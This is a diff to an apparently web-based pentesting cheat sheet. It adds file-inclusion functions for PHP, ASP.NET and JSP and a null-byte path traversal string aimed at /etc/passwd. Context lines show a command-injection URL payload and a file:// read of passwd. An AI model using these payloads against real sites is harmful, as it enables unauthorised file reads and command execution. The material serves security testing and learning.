@@ -51,6 +51,25 @@ http://victim/file?arg=$({chmod,+x,/tmp/t})
 
 > **File Inclusion**
 
+**Common Examples in Different Languages**
+
+{% highlight php %}
+//PHP
+require() 
+include()
+{% endhighlight %}
+
+{% highlight C# %}
+//ASP(.net)
+Response.WriteFile()
+Server.Execute()
+{% endhighlight %}
+
+{% highlight java %}
+//JSP
+<jsp:include page="" />
+{% endhighlight %}
+
 **Linux Test Strings:**
 
 {% highlight bash %}
@@ -59,6 +78,8 @@ http://website/?p=file%3a%2f%2f%2fetc%2fpasswd
 /ect/passwd
 
  ../../../../../../../../../../../../../../ect/passwd 
+ 
+  ../../../../../../../../../../../../../../ect/passwd%00
 {% endhighlight %}
 
 **Windows Test Strings:**
